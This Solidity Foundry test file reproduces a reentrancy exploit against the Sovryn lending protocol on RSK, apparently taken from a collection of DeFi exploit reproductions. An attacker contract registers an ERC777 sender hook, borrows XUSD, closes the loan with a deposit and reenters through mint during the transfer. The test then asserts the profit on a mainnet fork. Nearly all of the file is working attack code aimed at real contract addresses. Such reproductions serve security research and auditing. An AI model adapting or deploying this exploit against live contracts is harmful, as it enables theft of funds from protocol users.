// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface ISovrynERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface ISovrynLoanToken is IERC20 {
    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes calldata loanDataBytes
    ) external returns (uint256, uint256);
    function mint(address receiver, uint256 depositAmount) external returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);
    function loanParamsIds(
        uint256
    ) external view returns (bytes32);
}

interface ISovrynProtocol {
    function borrowerNonce(
        address borrower
    ) external view returns (uint256);
    function closeWithDeposit(bytes32 loanId, address receiver, uint256 depositAmount)
        external
        returns (uint256, uint256, address);
}

contract SovrynAttacker {
    ISovrynERC1820Registry private constant ERC1820 =
        ISovrynERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IERC20 private constant WRBTC = IERC20(0x542fDA317318eBF1d3DEAf76E0b632741A7e677d);
    IERC20 private constant XUSD = IERC20(0xef213441A85dF4d7ACbDaE0Cf78004e1E486bB96);
    ISovrynLoanToken private constant IXUSD = ISovrynLoanToken(0x849C47f9C259E9D62F289BF1b2729039698D8387);
    ISovrynProtocol private constant PROTOCOL = ISovrynProtocol(0x5A0D867e0D70Fcc6Ade25C3F1B89d618b5B4Eaa7);

    bool private reentered;

    constructor() {
        ERC1820.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    function attack() external {
        uint256 collateral = WRBTC.balanceOf(address(this));
        WRBTC.approve(address(IXUSD), collateral);
        IXUSD.borrow(bytes32(0), 10_000 ether, 10_000, collateral, address(WRBTC), address(this), address(this), "");

        uint256 nonce = PROTOCOL.borrowerNonce(address(this));
        bytes32 paramsId = IXUSD.loanParamsIds(uint256(keccak256(abi.encodePacked(address(WRBTC), true))));
        bytes32 loanId = keccak256(abi.encodePacked(paramsId, address(IXUSD), address(this), nonce));

        XUSD.approve(address(PROTOCOL), type(uint256).max);
        PROTOCOL.closeWithDeposit(loanId, address(this), 5_000 ether);

        IXUSD.burn(address(this), IXUSD.balanceOf(address(this)));
    }

    function tokensToSend(address operator, address from, address to, uint256, bytes calldata, bytes calldata)
        external
    {
        if (!reentered && operator == address(PROTOCOL) && from == address(this) && to == address(IXUSD)) {
            reentered = true;
            uint256 reentrantDeposit = 4_900 ether;
            XUSD.approve(address(IXUSD), reentrantDeposit);
            IXUSD.mint(address(this), reentrantDeposit);
        }
    }

    receive() external payable {}
}

contract SovrynExploitTest is Test {
    IERC20 private constant WRBTC = IERC20(0x542fDA317318eBF1d3DEAf76E0b632741A7e677d);
    IERC20 private constant XUSD = IERC20(0xef213441A85dF4d7ACbDaE0Cf78004e1E486bB96);

    function testExploit() public {
        vm.createSelectFork("https://public-node.rsk.co", 4_689_412);
        SovrynAttacker attacker = new SovrynAttacker();
        deal(address(WRBTC), address(attacker), 1.8 ether);

        attacker.attack();

        assertGt(XUSD.balanceOf(address(attacker)), 5_000 ether);
    }
}
